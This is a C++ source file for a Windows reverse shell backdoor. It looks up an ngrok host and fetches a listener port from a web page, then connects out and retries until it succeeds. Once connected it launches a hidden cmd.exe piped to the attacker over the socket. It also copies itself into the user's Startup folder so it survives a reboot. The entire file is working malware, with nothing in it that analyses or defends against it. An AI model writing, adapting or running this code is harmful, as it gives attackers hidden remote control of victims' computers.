
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <dirent.h>
#include <sys/stat.h>
// #include <conio.h>
#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

char* getAddr(char*);
unsigned int scrapPort(char* domainName);
bool checkStartUp();
std::string exec(std::string command);

std::string mainFile;

int main(int argc, char* argv[]) {
  mainFile = argv[0];
  char* buffer;
  unsigned int bufferSize = 64;
  checkStartUp();

  // listener ip, port on attacker's machine
  const char* ip = getAddr("0.tcp.ap.ngrok.io");
  short port = scrapPort("remotehostsmiley.000webhostapp.com");

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  while(true){
    if(recv(wSock, buffer, 64, 0)){
      break;
    }
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);

    // connect to remote host
    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;
    system("cls");
    std::cout << "[*] Waiting connection\n";
    Sleep(1000);
  }
  std::cout << "[+} Connected!\n";
  CreateProcess(NULL, (LPSTR)"C:\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);
  // getch();
  return 0;
}


char* getAddr(char* hostname){
  WSADATA ws;
    int res;
    // Initializing winsock
    // Before using any of the winsock constructs, the library must be initialized by calling the WSAStartup function. 
    res = WSAStartup ( MAKEWORD(2, 2), &ws );
    if ( res != 0 ){
      std::cout << "Failed to initialize winsock : " << res;
      exit(0);
  }
    
  // char * hostname;  
  struct hostent * host_info;
  struct in_addr addr;
  DWORD dw;
  int i = 0;
    
    // hostname = (char *)"0.tcp.ap.ngrok.io"; // hostname for which we want the IP address
    host_info = gethostbyname ( hostname ); // gethostbyname function retrieves host information.
  // gethostbyname returns a pointer of type struct hostent.
  //A null pointer is returned if an error occurs. The specific error number can be known by calling WSAGetLastError.
  
    if ( host_info == NULL ) {
      dw = WSAGetLastError ();
        if ( dw != 0 ) {
          if ( dw == WSAHOST_NOT_FOUND ) {
            std::cout << "Host is not found";
            exit(1);
          }
          else if ( dw == WSANO_DATA ) {
            std::cout << "No data record is found";
            exit(1);
          }
          else {
            std::cout << "Function failed with an error : " << dw;
            exit(1);
          }
        }
    }
  else {
    // std::cout << "Hostname : " << host_info->h_name << std::endl;
    while ( host_info->h_addr_list[i] != 0 ){
      addr.s_addr = *(u_long *) host_info->h_addr_list[i++];
      // std::cout<<"\nIP Address "<< inet_ntoa(addr); // inet_ntoa function converts IPv4 address to ASCII string in Internet standard dotted-decimal format.
    }
  }
  return inet_ntoa(addr);
}

unsigned int scrapPort(char* domainName){

  std::string dataChunk;
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        std::cout << "WSAStartup failed.\n";
        system("pause");
        return 1;
    }
    SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    struct hostent *host;
    
    host = gethostbyname(domainName);
  

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(80);
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
    // std::cout << "Connecting...\n";
    if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0){
        std::cout << "Could not connect";
        system("pause");
        return 1;
    }
   
    std::string stringTest;
    stringTest.append("GET / HTTP/1.1\r\nHost: ");
    stringTest.append(domainName);
    stringTest.append("\r\nConnection: close\r\n\r\n");

    send(Socket,stringTest.c_str(), strlen(stringTest.c_str()),0);
    char buffer[16];
    while ((recv(Socket,buffer,16,0)) > 0){        
        int i = 0;
        while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {
            // std::cout << buffer[i];
            dataChunk.push_back(buffer[i]);
            i++;
        }
    }
    closesocket(Socket);
    WSACleanup();
    // std::cout << "DATA: \n" << dataChunk << std::endl;
    unsigned first = dataChunk.find("<p>");
    unsigned last = dataChunk.find("</p>");
    std::string newPort = dataChunk.substr (first,last-first); 
    
    // std::cout << "PORT: " << newPort.substr(3,-1) << std::endl;
    // system("pause");
    return stoi(newPort.substr(3,-1));
}

bool checkStartUp(){
  bool testFlag = false;
  struct dirent *d;
	struct stat dst;
	DIR *dir;
  std::string user = exec("whoami"), path = "C:\\Users\\", copyCommand = "copy \"";



  user = user.substr(user.find("\\"));
  user = user.erase(0,1); //remove the '\'
  user = user.substr(0, user.size()-1); //remove endline

  path.append(user);
  path.append("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");

  copyCommand = copyCommand.append(mainFile);
  copyCommand = copyCommand.append("\" ");
  copyCommand = copyCommand.append("\"");
  copyCommand = copyCommand.append(path);
  copyCommand = copyCommand.append("\"");

  dir = opendir(path.c_str());

  if(dir != NULL){
    for(d = readdir(dir); d != NULL; d = readdir(dir)){
      std::string type = d->d_name;
      type = path + type;
      if (stat(type.c_str(), &dst) == 0){
				if (dst.st_mode & S_IFDIR){
					type = " is a FOLDER.";
				}
				else if (dst.st_mode & S_IFREG){
					type = " is a FILE.";
				}
			}
      // cout << d->d_name <<endl;
      if((mainFile.find((std::string)d->d_name) != std::string::npos) && ((std::string)d->d_name).length() > 4){
        // std::cout << "testFlag = true ; textLength = " << ((std::string)d->d_name).length() << "\n";
        testFlag = true;
      }
    }
    closedir(dir);
  } else {
    std::cout << "[!] Error opening directory!\n";
  }

  if(testFlag == false) {
    system(copyCommand.c_str());
  } else {
    // std::cout << "already in startup!\n";
    return true;
  }
  return false;
}

std::string exec(std::string command) {
  char buffer[128];
  std::string result = "";

  FILE* pipe = popen(command.c_str(), "r");
  if(!pipe){
    return "[!] Pipe Open Failure!\n";
  }
  while(!feof(pipe)){
    if(fgets(buffer, 128, pipe) != NULL){
      result += buffer;
    }
  }
  pclose(pipe);
  return result;
}
